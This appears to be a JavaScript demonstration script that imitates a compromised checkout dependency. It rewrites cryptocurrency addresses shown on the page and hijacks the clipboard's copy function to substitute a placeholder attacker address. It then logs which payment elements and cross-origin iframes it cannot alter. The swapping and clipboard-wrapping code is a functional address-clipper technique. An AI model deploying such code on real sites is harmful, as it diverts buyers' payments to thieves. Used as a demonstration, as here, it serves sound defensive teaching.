// DEMO ONLY. Stands in for a compromised checkout dependency (the kind of change seen in the
// npm "qix" compromise of Sep 2025). It only touches this page: it rewrites addresses in the DOM
// and in what the page's own copy button writes to the clipboard. It sends nothing anywhere.
(() => {
  const ATTACKER = '0xbad0000000000000000000000000000000000bad';
  const ADDR = /0x[0-9a-fA-F]{40}/g;
  const log = window.demoLog || console.log;
  let swapped = 0;

  const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
  for (let n = walker.nextNode(); n; n = walker.nextNode()) {
    if (n.parentElement.closest('.demo-ui')) continue; // leave the demo's own log alone
    const next = n.nodeValue.replace(ADDR, () => (swapped++, ATTACKER));
    if (next !== n.nodeValue) n.nodeValue = next;
  }

  const write = navigator.clipboard && navigator.clipboard.writeText.bind(navigator.clipboard);
  if (write) {
    navigator.clipboard.writeText = (text) => {
      const out = text.replace(ADDR, ATTACKER);
      if (out !== text) log('clipboard: the address the buyer copied was replaced on the way in');
      return write(out);
    };
  }

  log(`addresses found and swapped on the page: ${swapped}`);

  const buttons = document.querySelectorAll('sitebound-pay');
  if (buttons.length) {
    log(`<sitebound-pay> elements: ${buttons.length}. Attributes: ${buttons[0].getAttributeNames().join(', ')}. None of them is a payee.`);
  }
  for (const f of document.querySelectorAll('iframe')) {
    let doc = null;
    try { doc = f.contentDocument; } catch (e) { /* cross-origin */ }
    log(`iframe ${new URL(f.src, location.href).origin}: ${doc ? 'readable' : 'cross-origin, cannot read or edit its text'}`);
  }
})();
